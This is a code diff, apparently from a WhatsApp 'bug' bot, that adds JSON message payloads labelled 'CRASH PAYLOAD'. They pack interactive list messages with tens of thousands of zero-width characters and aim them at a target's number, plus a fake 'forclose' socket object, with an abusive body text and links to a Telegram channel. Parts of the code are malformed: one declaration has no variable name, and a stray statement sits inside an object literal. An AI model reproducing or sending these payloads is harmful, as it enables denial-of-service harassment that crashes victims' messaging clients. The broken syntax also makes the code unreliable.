@@ -1,0 +1,102 @@
+let = JSON.stringify({
+        name: "single_select",
+        params: {
+            title: "\u200C".repeat(90000),
+            sections: [
+                {
+                    title: "\u200C".repeat(90000),
+                    rows: Array(50).fill().map(() => ({
+                        title: "\u200D".repeat(90000),
+                        description: "\u200D".repeat(90000),
+                        rowId: "\u200D".repeat(90000)
+                    }))
+                }
+            ],
+            contextInfo: {
+                mentionedJid: [target],
+                forwardingScore: 999,
+                isForwarded: true,
+                externalAdReply: {
+                    title: "CRASH PAYLOAD",
+                    body: "FUCK YOU" + "\u200E".repeat(90000),
+                    mediaType: 2,
+                    thumbnailUrl: "https://files.catbox.moe/ri8m1p.jpg", //jangan di ganti kontol
+                    sourceUrl: "https://t.me/infothedevil"
+                }
+            }
+        }
+    });
+
+// Api Delay Version Ui By Yukina X Raldz
+
+let DevilApi = JSON.stringify({
+let WebThumb = `https://${"ꦾ".repeat(100)}.com/`
+        name: "single_select",
+        params: {
+            title: "\u200C".repeat(90000),
+            sections: [
+                {
+                    title: "\u200C".repeat(90000),
+                    rows: Array(50).fill().map(() => ({
+                        title: "\u200D".repeat(90000),
+                        description: "\u200D".repeat(90000),
+                        rowId: "\u200D".repeat(90000)
+                    }))
+                }
+            ],
+            contextInfo: {
+                mentionedJid: [target],
+                forwardingScore: 999,
+                isForwarded: true,
+                externalAdReply: {
+                    title: "CRASH PAYLOAD",
+                    body: "NESTED STRUCTURE" + "\u200E".repeat(90000),
+                    mediaType: 2,
+                    thumbnailUrl: "https://files.catbox.moe/ri8m1p.jpg",
+                    sourceUrl: WebThumb
+                }
+            }
+        }
+    });
+ 
+// Api Forclose
+
+let THEDEVILSISHERE = JSON.stringify({
+  status: true,
+  criador: "Yukina",
+  resultado: {
+    type: "md",
+    ws: {
+      _events: {
+        "CB:ib,,dirty": ["Array"]
+      },
+      _eventsCount: 80000,
+      _maxListeners: 0,
+      url: "wss://web.whatsapp.com/ws/chat",
+      config: {
+        version: ["Array"],
+        browser: ["Array"],
+        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
+        sockCectTimeoutMs: 2000,
+        keepAliveIntervalMs: 30000,
+        logger: {},
+        printQRInTerminal: false,
+        emitOwnEvents: true,
+        defaultQueryTimeoutMs: 6000,
+        customUploadHosts: [],
+        retryRequestDelayMs: 250,
+        maxMsgRetryCount: 5,
+        fireInitQueries: true,
+        auth: { Object: "authData" },
+        markOnlineOnsockCect: true,
+        syncFullHistory: true,
+        linkPreviewImageThumbnailWidth: 192,
+        transactionOpts: { Object: "transactionOptsData" },
+        generateHighQualityLinkPreview: false,
+        options: {},
+        appStateMacVerification: { Object: "appStateMacData" },
+        mobile: true
+      }
+    }
+  }
+});
